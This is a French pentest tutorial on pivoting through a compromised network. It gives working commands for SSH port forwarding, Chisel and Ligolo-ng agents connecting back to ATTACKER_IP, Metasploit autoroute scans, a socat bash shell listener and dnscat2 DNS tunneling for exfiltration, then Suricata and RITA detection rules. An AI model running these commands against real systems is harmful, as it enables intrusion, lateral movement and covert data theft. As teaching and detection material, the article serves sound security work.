# Tunneling et pivoting réseau : se déplacer dans un réseau compromis

Le pivoting est la technique par laquelle un attaquant utilise une machine compromise comme **tremplin** pour atteindre des segments réseau inaccessibles directement. C'est aussi une compétence essentielle pour les pentesters afin de simuler des APT réalistes.

## Concepts fondamentaux

```
Situation typique :

Internet ──→ [DMZ] ──→ [Réseau interne]
                            │
                     Pas d'accès direct depuis Internet
                     Uniquement accessible via la DMZ

Après compromission d'un serveur DMZ :

Attaquant → [Serveur DMZ compromis] → [Réseau interne]
                     ↑
               Machine pivot
```

## SSH Tunneling

### Port Forwarding Local

```bash
# Accéder à un service interne via la machine pivot
# Scénario : BDD MySQL sur 192.168.1.50:3306 (inaccessible directement)

ssh -L 3307:192.168.1.50:3306 user@pivot.exemple.com
# -L [port_local]:[cible]:[port_cible]

# Maintenant accessible localement :
mysql -h 127.0.0.1 -P 3307 -u root -p
# La connexion est tunnelée via SSH vers le MySQL interne
```

### Port Forwarding Distant

```bash
# Exposer un service local vers une machine distante
# Scénario : exposer votre listener Metasploit depuis derrière un NAT

ssh -R 4444:127.0.0.1:4444 user@serveur-public.com
# -R [port_distant]:[host_local]:[port_local]

# Sur le serveur public, le port 4444 est maintenant connecté à votre machine locale
```

### Dynamic Port Forwarding (SOCKS Proxy)

```bash
# Créer un proxy SOCKS5 qui route tout via la machine pivot
ssh -D 1080 user@pivot.exemple.com
# -D [port_socks_local]

# Configurer proxychains pour utiliser le tunnel
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080

# Utiliser n'importe quel outil via le tunnel
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains firefox  # Naviguer sur le réseau interne
proxychains curl http://intranet.interne/
```

## Chisel — Tunneling via HTTP/S

```bash
# Chisel : tunnel TCP/UDP dans HTTP — passe les firewalls !
# https://github.com/jpillora/chisel

# Sur l'attaquant (serveur)
./chisel server --port 8080 --reverse

# Sur la machine pivot (client)
./chisel client ATTACKER_IP:8080 R:socks
# Crée un tunnel SOCKS5 inversé

# Tunneling d'un port spécifique
./chisel client ATTACKER_IP:8080 R:3306:192.168.1.50:3306
# Le port 3306 de l'attaquant est maintenant connecté à la BDD interne
```

## Socat — Swiss Army Knife du réseau

```bash
# Relay TCP simple (pivoting basique)
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80
# Tout ce qui arrive sur 8080 est redirigé vers 192.168.1.50:80

# Relay avec chiffrement SSL
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:192.168.1.50:80

# Créer un reverse shell persistant
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

## Metasploit - Pivoting avancé

```bash
# Dans Metasploit - après avoir un shell sur la machine pivot
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > set SUBNET 192.168.1.0
msf6 post(autoroute) > run
# Metasploit route maintenant vers 192.168.1.0/24 via la session 1

# Scan du réseau interne via le pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(tcp) > set PORTS 22,80,443,3306,3389
msf6 auxiliary(tcp) > run

# SOCKS proxy via Metasploit
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run
```

## Ligolo-ng — Le pivot moderne

```bash
# Ligolo-ng : tunneling TUN/TAP - le plus transparent
# https://github.com/nicocha30/ligolo-ng

# Sur l'attaquant (proxy)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Sur la machine pivot (agent)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Dans l'interface ligolo
ligolo-ng » session
ligolo-ng » start --tun ligolo

# Ajouter une route vers le réseau interne
sudo ip route add 192.168.1.0/24 dev ligolo

# Maintenant accessible directement !
nmap -sV 192.168.1.50
curl http://192.168.1.50/
ssh user@192.168.1.50
```

## DNS Tunneling — Exfiltration furtive

```python
# Le DNS tunneling encapsule des données dans des requêtes DNS
# Passe presque tous les firewalls car le DNS est toujours autorisé

# Dnscat2 - Tunnel C2 via DNS
# Côté serveur (contrôlé par l'attaquant)
ruby dnscat2.rb --dns domain=tunnel.exemple.com --no-cache

# Côté client (machine compromise)
./dnscat --dns server=8.8.8.8,port=53,domain=tunnel.exemple.com

# Les communications sont encodées dans des requêtes DNS :
# Requête : a1b2c3d4.tunnel.exemple.com (données encodées dans le sous-domaine)
# Réponse : TXT record avec données de réponse

# Détection du DNS tunneling
# → Requêtes DNS avec sous-domaines anormalement longs
# → Volume élevé de requêtes vers un seul domaine
# → Entropie élevée dans les noms de sous-domaines
```

## Détection des tunnels

```bash
# Détecter le SSH tunneling avec Suricata
alert tcp any any -> any 22 (msg:"SSH Tunnel Suspected";
  flow:to_server,established;
  content:"|00 00 00|";
  threshold:type both, track by_src, count 100, seconds 60;
  sid:1000001;)

# Détecter le DNS tunneling avec RITA
# Analyse le traffic Zeek et détecte les beacons et DNS tunnels
rita analyze --input zeek_logs/ --output rita-analysis/
rita show-exploded-dns -H --limit 100 rita-analysis

# Seuils suspects :
# DNS queries/minute > 100 vers même domaine
# Longueur moyenne sous-domaine > 30 caractères
# Entropie de Shannon > 3.5 bits/caractère
```

## Conclusion

Le pivoting est une compétence avancée qui démontre la vraie profondeur d'une compromission. En défense, la **segmentation réseau stricte** (micro-segmentation) limite considérablement les possibilités de pivoting. En attaque/test, maîtriser SSH tunneling, Chisel et Ligolo-ng permet de simuler fidèlement le comportement des APT réels.

---
*Article suivant : [SIEM et détection d'intrusion](../articles/siem-detection)*
